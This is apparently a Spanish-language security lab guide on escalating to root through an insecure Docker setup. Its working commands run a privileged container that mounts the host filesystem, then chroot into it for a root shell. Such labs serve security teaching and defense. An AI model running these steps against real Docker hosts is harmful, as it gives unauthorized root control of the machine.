# Laboratorio 3: Escalando privilegios

El objetivo del siguiente laboratorio es explotar una configuración insegura de Docker para escalar privilegios y obtener acceso root en el host de Docker.

### Requisitos previos
- Una instancia Ubuntu con Docker instalado.
- Socket daemond expuesto sin TLS
- Docker CLI configurado en la máquina local apuntando al host de Docker.
- Un usuario con permisos para ejecutar contenedores en Docker.

**Paso 1** Ejecuta el siguiente comando en tu máquina local para desplegar un contenedor inseguro:

        docker run -d --rm --name vulnerable-container \
        --privileged \
        -v /:/host \
        ubuntu:latest sleep infinity

**Paso 2** Explota la vulnerabilidad

        docker exec -it vulnerable-container /bin/bash

**Paso 3** Dentro del contenedor, accede al sistema de archivos del host:

        cd /host
        ls -la

Deberías ver el sistema de archivos completo del host. Ahora, cambia al usuario root del host ejecutando:

        chroot /host /bin/bash

Esto te dará una shell con permisos de root en la instancia. Confírmalo ejecutando:

        whoami
